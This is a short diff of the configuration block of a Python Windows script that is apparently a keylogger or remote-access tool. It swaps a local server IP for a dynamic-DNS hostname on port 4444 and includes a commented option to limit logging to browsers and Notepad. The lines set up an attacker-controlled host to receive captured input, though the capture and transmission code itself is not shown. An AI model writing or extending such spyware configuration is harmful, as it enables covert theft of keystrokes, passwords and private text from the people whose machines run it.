@@ -24,8 +24,7 @@ import win32process
 import winreg
 
 # --- Configuration ---
-CONFIG_URL = 'http://192.168.100.9:8000/config.txt'  # URL to fetch server IP from
-SERVER_HOST = '192.168.100.9'  # Fallback server IP
+SERVER_HOST = 'codex.webhob.me' # DDNS hostname
 SERVER_PORT = 4444
 # Optional: Restrict logging to specific applications
 # TARGET_APPS = ["chrome.exe", "firefox.exe", "notepad.exe"] 
